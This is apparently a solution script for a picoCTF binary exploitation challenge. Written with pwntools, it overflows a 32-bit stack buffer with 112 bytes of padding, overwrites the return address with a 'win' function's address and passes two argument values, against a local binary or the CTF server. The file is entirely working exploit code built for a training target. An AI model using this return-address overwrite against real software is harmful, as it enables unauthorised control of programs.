#!/usr/bin/env python3
import os
from pwn import *
from pwn_ext import *

exe = ELF("./vuln_patched")

context.binary = exe
# GDB Compatability stuff
if "alacritty" in os.environ["TERM"]:
    context.terminal = ["alacritty", "-e"]
elif "tmux" in os.environ["TERM"]:
    context.terminal = ["tmux", "splitw", "-h"]
elif os.environ["GNOME_TERMINAL_SCREEN"]:
    context.terminal = ["gnome-terminal", "--"]

# Who needs more than one process?
if args.REMOTE:
    #p = remote("addr", 1337)
    p = nc_remote("saturn.picoctf.net:60350") # host:port here
elif args.CLEAN:
    p = process([exe.path])
else:
    gdbscript = '''
    set sysroot /
    b* 0x08049364
    c
    '''
    p = gdb.debug([exe.path], gdbscript=gdbscript)

### PUT ACTUAL PWN STUFF BELOW THIS LINE ###

def main():
    # good luck pwning :)
    win_addr = exe.symbols["win"]
    p.recvuntil(b"Please enter your string: ")
    print(cyclic_find("daab"))
    # Calling convention in 32-bit is: return address, arg1, arg2 ... argN and so on.
    # The p32(0x0) sets the ESP (stack pointer) to an invalid address. 
    # (we dont care if we crash after the win function has run)
    p.send(b"A" * 112 + p32(win_addr) + p32(0x0) + p32(0xCAFEF00D) + p32(0xF00DF00D))

    p.interactive()

if __name__ == "__main__":
    main()
